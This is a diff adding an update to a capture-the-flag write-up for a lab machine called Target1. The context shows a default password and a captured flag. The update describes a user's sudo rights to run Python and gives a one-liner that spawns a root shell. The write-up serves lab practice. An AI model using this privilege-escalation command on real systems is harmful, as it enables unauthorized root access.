@@ -116,3 +116,14 @@ Password: toor
 flag4.txt`{715ea6c055b9fe3337544932f291ce}
 ```
   ![FinalFlagRaven](https://user-images.githubusercontent.com/96896057/181392857-f4ecb93d-9390-4421-821f-1639548f18f4.png)
+
+___
+***Update:*** Upon returning to this box I ran the following command while logged in as steven:
+```
+sudo -l
+```
+This showed that steven has sudo permission's to run Python.  Upon further diving and searching online the following command can be used to properly gain 'root' on the Target1 machine:
+
+```
+sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
+```
